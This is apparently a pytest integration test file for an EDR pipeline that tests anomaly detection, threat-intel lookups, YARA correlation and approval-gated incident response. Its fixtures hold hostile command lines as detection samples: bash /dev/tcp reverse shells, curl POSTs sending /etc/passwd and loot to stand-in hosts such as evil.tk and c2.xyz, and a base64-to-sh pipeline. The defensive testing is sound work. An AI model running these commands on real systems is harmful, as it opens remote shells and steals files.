"""
EDR Integration Tests — M3.1
==============================
Tests the full behavioral → YARA → threat intel → incident response pipeline
using in-memory SQLite, mocked SSH, and mocked external APIs.

All tests are isolated: no real network, no real PostgreSQL, no real SSH.

Markers:
  - No marker: fast, pure in-memory tests.
  - @pytest.mark.integration: requires live containers (DATABASE_URL env set).
"""

from __future__ import annotations

import sys
import os
import json
import time
import asyncio
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch, AsyncMock

import pytest
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(__file__)))))

# ── In-memory DB fixture ───────────────────────────────────────────────────────

@pytest.fixture(scope="module")
def sqlite_engine():
    """SQLite in-memory engine with EDR schema."""
    from sqlalchemy import Table, Column, Integer, String
    from services.scanner_engine.models.edr import Base, BehavioralFinding, IncidentResponseLog, ThreatIntelCache

    engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False})

    # Register a stub 'assets' table in the same Base.metadata so the FK in
    # BehavioralFinding.asset_id can be resolved during DDL table sorting.
    Table("assets", Base.metadata,
          Column("id", Integer, primary_key=True),
          Column("ip_address", String),
          extend_existing=True)

    Base.metadata.create_all(engine)
    yield engine
    engine.dispose()


@pytest.fixture
def db(sqlite_engine):
    """Function-scoped DB session; rolls back after each test."""
    Session = sessionmaker(bind=sqlite_engine)
    session = Session()
    yield session
    session.rollback()
    session.close()


@pytest.fixture
def sample_behavioral_finding(db):
    """Persist and return a sample BehavioralFinding."""
    from services.scanner_engine.models.edr import BehavioralFinding
    bf = BehavioralFinding(
        asset_id=42,
        scan_id="test-scan-001",
        process_name="bash",
        anomaly_type="C2_CALLBACK",
        severity="HIGH",
        confidence_score=85,
        detection_method="behavioral_heuristic",
        status="open",
        indicators={
            "cmdline": "bash -c 'curl -X POST http://evil.tk/shell'",
            "matched": ["curl POST", "evil.tk"],
        },
        mitre_attack_tactics=["TA0011", "TA0002"],
    )
    db.add(bf)
    db.commit()
    db.refresh(bf)
    return bf


@pytest.fixture
def sample_ti_cache(db):
    """Persist a malicious IP in threat_intel_cache."""
    from services.scanner_engine.models.edr import ThreatIntelCache
    entry = ThreatIntelCache(
        ioc_value="45.77.1.1",
        ioc_type="ip",
        is_malicious=True,
        malicious_votes=3,
        vt_result={"malicious": 15, "suspicious": 2},
        crowdsec_result={"reputation": "malicious"},
        otx_result={"pulse_count": 3},
        ttl_expires=datetime.utcnow() + timedelta(hours=12),
    )
    db.add(entry)
    db.commit()
    db.refresh(entry)
    return entry


# ── ProcessInfo factory ────────────────────────────────────────────────────────

def proc(command: str, args: str = "", pid: int = 1000, user: str = "root"):
    from services.scanner_engine.clients.behavioral_ssh_client import ProcessInfo
    return ProcessInfo(pid=pid, ppid=1, user=user, cpu_percent=0.0, mem_percent=0.0,
                       command=command, args=args)


# ══════════════════════════════════════════════════════════════════════════════
# PIPELINE: Behavioral → DB persistence
# ══════════════════════════════════════════════════════════════════════════════

class TestBehavioralPipeline:
    """Behavioral detection → DB persistence pipeline."""

    def test_analyze_and_persist_findings(self, db):
        """Detected anomalies should be persistable as BehavioralFinding rows."""
        from services.scanner_engine.services.anomaly_detector import analyze_processes
        from services.scanner_engine.models.edr import BehavioralFinding

        processes = [
            proc("bash", "-i >& /dev/tcp/8.8.8.8/4444 0>&1"),
            proc("curl", "-X POST http://c2.xyz/data -d @/etc/passwd"),
            proc("nginx", "-g 'daemon off;'"),  # clean
        ]
        anomalies = analyze_processes(processes)
        assert len(anomalies) >= 2

        # Persist
        for a in anomalies:
            row = BehavioralFinding(
                asset_id=1,
                scan_id="test-scan-001",
                process_name=a.process.command,
                anomaly_type=a.anomaly_type,
                severity=a.severity,
                confidence_score=a.confidence_score,
                detection_method=a.detection_method,
                status="open",
                indicators={"cmdline": a.process.full_cmdline, "matched": a.indicators},
                mitre_attack_tactics=a.mitre_attack_tactics,
            )
            db.add(row)
        db.commit()

        count = db.query(BehavioralFinding).filter_by(asset_id=1).count()
        assert count == len(anomalies)

    def test_severity_distribution_realistic(self):
        """Mix of attack types should produce a range of severities."""
        from services.scanner_engine.services.anomaly_detector import analyze_processes

        processes = [
            proc("bash", "-i >& /dev/tcp/1.2.3.4/4444 0>&1"),         # revshell → HIGH+
            proc("curl", "-X POST http://evil.tk/c2 -d loot"),          # C2 → HIGH
            proc("sudo", "-S /bin/sh"),                                  # privesc → MEDIUM+
            proc("bash", "-c 'echo aGVsbG8= | base64 -d | sh'"),       # obfuscation
        ]
        results = analyze_processes(processes)
        severities = {r.severity for r in results}
        assert len(severities) >= 2

    def test_clean_production_processes_no_fp(self):
        """Production-like process list should generate zero false positives."""
        from services.scanner_engine.services.anomaly_detector import analyze_processes

        prod_processes = [
            proc("systemd", "--switched-root --system --deserialize 21"),
            proc("sshd", "-D"),
            proc("nginx", "worker process"),
            proc("postgres", "-D /var/lib/postgresql/15/main"),
            proc("redis-server", "0.0.0.0:6379"),
            proc("celery", "worker -l info -Q vulnerabilities"),
            proc("uvicorn", "services.scanner_engine.main:app --host 0.0.0.0 --port 8002"),
            proc("python3", "-m gunicorn services.ai_reasoning.main:app"),
        ]
        results = analyze_processes(prod_processes)
        # Tolerate at most 1 false positive (some tools match broad patterns)
        assert len(results) <= 1, f"Too many FPs: {[r.anomaly_type for r in results]}"


# ══════════════════════════════════════════════════════════════════════════════
# PIPELINE: IOC Extraction → Threat Intel lookup (mocked APIs)
# ══════════════════════════════════════════════════════════════════════════════

class TestThreatIntelPipeline:
    """IOC extraction → threat intel cache → verdict pipeline."""

    def test_ioc_extracted_from_finding_indicators(self, sample_behavioral_finding):
        from services.scanner_engine.services.ioc_extractor import extract_iocs
        iocs = extract_iocs(sample_behavioral_finding.indicators)
        domains = [i for i in iocs if i.ioc_type == "domain"]
        assert any("evil.tk" in i.value for i in domains)

    def test_threat_intel_cache_hit(self, db, sample_ti_cache):
        """lookup_ioc should return cached entry without calling APIs."""
        import services.scanner_engine.services.threat_intel_service as _ti
        from services.scanner_engine.services.threat_intel_service import lookup_ioc
        from services.scanner_engine.services.ioc_extractor import IOC

        ioc = IOC(value="45.77.1.1", ioc_type="ip")

        # Patch client lookup methods to raise — they should NOT be called on cache hit
        with patch.object(_ti._vt, "lookup_ip", side_effect=Exception("API should not be called")), \
             patch.object(_ti._crowdsec, "lookup_ip", side_effect=Exception("API should not be called")), \
             patch.object(_ti._otx, "lookup_ip", side_effect=Exception("API should not be called")):

            result = lookup_ioc(db, ioc, force_refresh=False)

        assert result is not None
        assert result.is_malicious is True

    def test_threat_intel_malicious_escalates_severity(self, db, sample_behavioral_finding, sample_ti_cache):
        """A finding with a malicious IOC should have its severity escalated."""
        from services.scanner_engine.services.ioc_extractor import extract_iocs, IOC
        from services.scanner_engine.services.threat_intel_service import lookup_ioc, SEVERITY_ESCALATE

        # Modify finding to contain the known malicious IP
        sample_behavioral_finding.indicators = {
            "cmdline": f"bash -c 'curl http://45.77.1.1/shell'",
            "matched": [],
        }
        db.commit()

        iocs = extract_iocs(sample_behavioral_finding.indicators)
        ip_iocs = [i for i in iocs if i.ioc_type == "ip"]

        original_severity = sample_behavioral_finding.severity
        for ioc in ip_iocs:
            cached = lookup_ioc(db, ioc, force_refresh=False)
            if cached and cached.is_malicious:
                new_sev = SEVERITY_ESCALATE.get(original_severity, original_severity)
                sample_behavioral_finding.severity = new_sev
                break

        db.commit()
        assert sample_behavioral_finding.severity == SEVERITY_ESCALATE.get(original_severity, original_severity)

    def test_verdict_threshold_votes(self):
        """Malicious verdict requires >= 3 votes across VT+CS+OTX."""
        from services.scanner_engine.services.threat_intel_service import _verdict

        # VT: malicious=8 (votes+=8), CS: reputation="malicious" (votes+=5), OTX: pulse_count=2 (votes+=2)
        is_mal, votes = _verdict(
            vt={"malicious": 8, "suspicious": 0},
            cs={"reputation": "malicious"},
            otx={"pulse_count": 2},
        )
        assert is_mal is True
        assert votes >= 3

        # 1 vote → not malicious (VT malicious<3, CS clean, OTX<2)
        is_mal2, votes2 = _verdict(
            vt={"malicious": 1, "suspicious": 0},
            cs={"reputation": "clean"},
            otx={"pulse_count": 0},
        )
        assert is_mal2 is False
        assert votes2 < 3

    def test_verdict_all_clean(self):
        from services.scanner_engine.services.threat_intel_service import _verdict
        is_mal, votes = _verdict(
            vt={"malicious_count": 0},
            cs={"reputation": 0},
            otx={"pulse_count": 0},
        )
        assert is_mal is False
        assert votes == 0

    def test_ttl_cache_expired_entry_triggers_refresh(self, db):
        """Expired cache entry should trigger a real lookup (mocked here)."""
        from services.scanner_engine.models.edr import ThreatIntelCache
        from services.scanner_engine.services.ioc_extractor import IOC

        # Insert expired entry
        expired = ThreatIntelCache(
            ioc_value="99.99.99.99",
            ioc_type="ip",
            is_malicious=False,
            malicious_votes=0,
            ttl_expires=datetime.utcnow() - timedelta(hours=1),
        )
        db.add(expired)
        db.commit()

        # Mock the VT client to return clean
        mock_vt = MagicMock()
        mock_vt.lookup_ip.return_value = {"malicious_count": 0}
        mock_cs = MagicMock()
        mock_cs.lookup_ip.return_value = {"reputation": 0}
        mock_otx = MagicMock()
        mock_otx.lookup_ip.return_value = {"pulse_count": 0}

        with patch("services.scanner_engine.services.threat_intel_service.VirusTotalClient", return_value=mock_vt), \
             patch("services.scanner_engine.services.threat_intel_service.CrowdSecClient", return_value=mock_cs), \
             patch("services.scanner_engine.services.threat_intel_service.OTXClient", return_value=mock_otx):
            from services.scanner_engine.services.threat_intel_service import lookup_ioc
            ioc = IOC(value="99.99.99.99", ioc_type="ip")
            result = lookup_ioc(db, ioc, force_refresh=False)

        assert result is not None


# ══════════════════════════════════════════════════════════════════════════════
# PIPELINE: YARA correlation with behavioral findings
# ══════════════════════════════════════════════════════════════════════════════

class TestYARAPipeline:
    """YARA + behavioral correlation pipeline."""

    def test_yara_behavioral_correlation_boosts_confidence(self):
        import services.scanner_engine.services.yara_scanner as _ys
        from services.scanner_engine.services.anomaly_detector import analyze_processes, AnomalyResult
        from services.scanner_engine.services.yara_scanner import YaraMatch, merge_yara_with_anomalies

        p = proc("bash", "-i >& /dev/tcp/10.10.10.1/4444 0>&1")
        behavioral = analyze_processes([p])
        assert len(behavioral) > 0

        original_conf = behavioral[0].confidence_score

        yara_hit = YaraMatch(
            rule_name="Reverse_Shell_Bash_DevTCP",
            severity="CRITICAL",
            mitre="TA0002",
            family="RevShell",
            description="Bash /dev/tcp reverse shell",
        )

        with patch.object(_ys, "_YARA_AVAILABLE", True), \
             patch.object(_ys, "_get_compiled", return_value=object()), \
             patch(
                 "services.scanner_engine.services.yara_scanner.scan_cmdline",
                 return_value=[yara_hit],
             ):
            merged = merge_yara_with_anomalies([p], behavioral)

        correlated = [a for a in merged if "yara" in a.detection_method.lower()]
        assert len(correlated) > 0
        assert correlated[0].confidence_score >= original_conf

    def test_yara_only_result_has_correct_type(self):
        import services.scanner_engine.services.yara_scanner as _ys
        from services.scanner_engine.services.yara_scanner import YaraMatch, merge_yara_with_anomalies

        p = proc("powershell", "-enc SQBFAFgA")
        yara_hit = YaraMatch(
            rule_name="Obfuscation_PowerShell_EncodedCmd",
            severity="HIGH",
            mitre="TA0005",
            family="Obfuscation",
            description="Encoded PS",
        )

        with patch.object(_ys, "_YARA_AVAILABLE", True), \
             patch.object(_ys, "_get_compiled", return_value=object()), \
             patch(
                 "services.scanner_engine.services.yara_scanner.scan_cmdline",
                 return_value=[yara_hit],
             ):
            merged = merge_yara_with_anomalies([p], [])

        assert any(a.anomaly_type == "YARA_MATCH" for a in merged)
        assert all(a.detection_method == "yara" for a in merged if a.anomaly_type == "YARA_MATCH")


# ══════════════════════════════════════════════════════════════════════════════
# PIPELINE: Incident Response — create / approve workflow
# ══════════════════════════════════════════════════════════════════════════════

class TestIncidentResponsePipeline:
    """IR action create → TOTP+PIN approve → execute flow."""

    def test_create_ir_action_persisted(self, db):
        """IR action should be persisted with status=pending."""
        from services.scanner_engine.models.edr import IncidentResponseLog

        action = IncidentResponseLog(
            asset_id=42,
            action_type="kill_process",
            target_detail="PID:1234",
            requested_by="security_officer",
            status="pending",
            approval_token=json.dumps({"totp_secret": "JBSWY3DPEHPK3PXP", "pin_hash": "x"}),
        )
        db.add(action)
        db.commit()
        db.refresh(action)

        assert action.id is not None
        assert action.status == "pending"

    def test_totp_code_validates(self):
        """pyotp TOTP verification should succeed with valid code."""
        import pyotp
        secret = pyotp.random_base32()
        totp = pyotp.TOTP(secret)
        code = totp.now()
        assert totp.verify(code, valid_window=8) is True

    def test_invalid_totp_rejected(self):
        import pyotp
        secret = pyotp.random_base32()
        totp = pyotp.TOTP(secret)
        assert totp.verify("000000", valid_window=1) is False

    def test_pin_bcrypt_hash_verify(self):
        """bcrypt PIN hash from approval_token must verify correctly."""
        import bcrypt
        pin = "SecureP4ss!"
        hashed = bcrypt.hashpw(pin.encode(), bcrypt.gensalt()).decode()
        assert bcrypt.checkpw(pin.encode(), hashed.encode()) is True
        assert bcrypt.checkpw(b"WrongPin", hashed.encode()) is False

    def test_approve_flow_status_transition(self, db):
        """Approving an action should transition status: pending → approved."""
        from services.scanner_engine.models.edr import IncidentResponseLog
        import bcrypt, pyotp

        secret = pyotp.random_base32()
        pin = "Test1234"
        pin_hash = bcrypt.hashpw(pin.encode(), bcrypt.gensalt()).decode()

        action = IncidentResponseLog(
            asset_id=10,
            action_type="block_ip",
            target_detail="45.77.1.1",
            requested_by="analyst",
            status="pending",
            approval_token=json.dumps({"totp_secret": secret, "pin_hash": pin_hash}),
        )
        db.add(action)
        db.commit()

        # Simulate approval validation
        token = json.loads(action.approval_token)
        totp = pyotp.TOTP(token["totp_secret"])
        code = totp.now()

        pin_ok = bcrypt.checkpw(pin.encode(), token["pin_hash"].encode())
        totp_ok = totp.verify(code, valid_window=8)

        assert pin_ok and totp_ok

        action.status = "approved"
        action.approved_by = "security_officer"
        db.commit()

        db.refresh(action)
        assert action.status == "approved"

    def test_action_cannot_execute_without_approval(self, db):
        """Actions in 'pending' state should not be executable."""
        from services.scanner_engine.models.edr import IncidentResponseLog

        action = IncidentResponseLog(
            asset_id=5,
            action_type="isolate_host",
            target_detail="10.0.0.5",
            requested_by="analyst",
            status="pending",
            approval_token="{}",
        )
        db.add(action)
        db.commit()

        # Simulate the executor check
        assert action.status != "approved", "Should not be approved yet"

    def test_ir_action_types_all_valid(self, db):
        """All 5 action types should be storable."""
        from services.scanner_engine.models.edr import IncidentResponseLog

        action_types = ["kill_process", "quarantine_file", "block_ip", "isolate_host", "collect_forensics"]
        for action_type in action_types:
            a = IncidentResponseLog(
                asset_id=1,
                action_type=action_type,
                target_detail="test-target",
                requested_by="test",

                status="pending",
                approval_token="{}",
            )
            db.add(a)
        db.commit()

        count = db.query(IncidentResponseLog).count()
        assert count >= len(action_types)


# ══════════════════════════════════════════════════════════════════════════════
# PIPELINE: M8 EDR context builder
# ══════════════════════════════════════════════════════════════════════════════

class TestM8EDRContextBuilder:
    """EDR context builder for M8 integration."""

    def test_build_edr_context_returns_empty_for_unknown_asset(self):
        # SessionLocal is imported inside build_edr_context_for_asset at call time
        # from shared.database — patch there
        mock_db = MagicMock()
        mock_db.execute.return_value.fetchall.return_value = []

        mock_session_local = MagicMock(return_value=mock_db)

        with patch("shared.database.SessionLocal", mock_session_local):
            from services.ai_reasoning.edr_context_builder import build_edr_context_for_asset
            result = build_edr_context_for_asset(99999)

        assert result == {}

    def test_kill_chain_deterministic_fallback(self):
        """Deterministic kill chain should compute correct risk score."""
        from services.ai_reasoning.kill_chain_detector import _deterministic_analysis

        behavioral = {
            "active_c2_detected": True,
            "severity": "CRITICAL",
            "yara_hits": 2,
            "total_findings": 5,
            "anomalies": [
                {"type": "C2_CALLBACK", "severity": "CRITICAL"},
                {"type": "PRIVILEGE_ESCALATION", "severity": "HIGH"},
            ],
        }
        threat_intel = {
            "malicious_ips": ["45.77.1.1"],
            "c2_confidence": 0.9,
        }
        vulns = [{"cve_id": "CVE-2021-44228", "cvss": 10.0, "title": "Log4Shell"}]

        result = _deterministic_analysis(
            asset_id=1,
            vulnerabilities=vulns,
            behavioral=behavioral,
            threat_intel=threat_intel,
        )

        assert result["kill_chain_detected"] is True
        # base=10.0 × C2×1.5 × TI×1.4 × YARA×1.3 × PrivEsc×1.2 = capped at 10.0
        assert result["risk_score_dynamic"] == 10.0
        assert result["recommended_action"] == "RECOMENDAR_APROBACION_M4_INMEDIATA"

    def test_kill_chain_no_c2_is_false(self):
        from services.ai_reasoning.kill_chain_detector import _deterministic_analysis

        behavioral = {"active_c2_detected": False, "severity": "LOW", "yara_hits": 0, "anomalies": []}
        threat_intel = {"malicious_ips": [], "c2_confidence": 0.0}
        vulns = [{"cve_id": "CVE-2024-1234", "cvss": 5.0, "title": "Moderate vuln"}]

        result = _deterministic_analysis(1, vulns, behavioral, threat_intel)
        assert result["kill_chain_detected"] is False
        assert result["risk_score_dynamic"] == 5.0

    def test_edr_multiplier_applied_in_prioritizer(self):
        """Prioritizer._apply_edr_multiplier should boost score with C2."""
        from services.ai_reasoning.prioritizer import Prioritizer

        p = Prioritizer()
        base = 5.0
        ctx = {
            "behavioral": {"active_c2_detected": True, "severity": "CRITICAL", "yara_hits": 0},
            "threat_intel": {"malicious_ips": []},
        }
        adjusted, note = p._apply_edr_multiplier(base, ctx)
        assert adjusted > base
        assert "C2" in note

    def test_edr_multiplier_cap(self):
        from services.ai_reasoning.prioritizer import Prioritizer
        p = Prioritizer()
        # All multipliers active: 1.5 × 1.4 × 1.3 = 2.73 → capped at 2.0
        ctx = {
            "behavioral": {"active_c2_detected": True, "severity": "CRITICAL", "yara_hits": 1},
            "threat_intel": {"malicious_ips": ["1.2.3.4"]},
        }
        adjusted, _ = p._apply_edr_multiplier(3.0, ctx)
        # Cap: 3.0 × 2.0 = 6.0 max
        assert adjusted <= 10.0
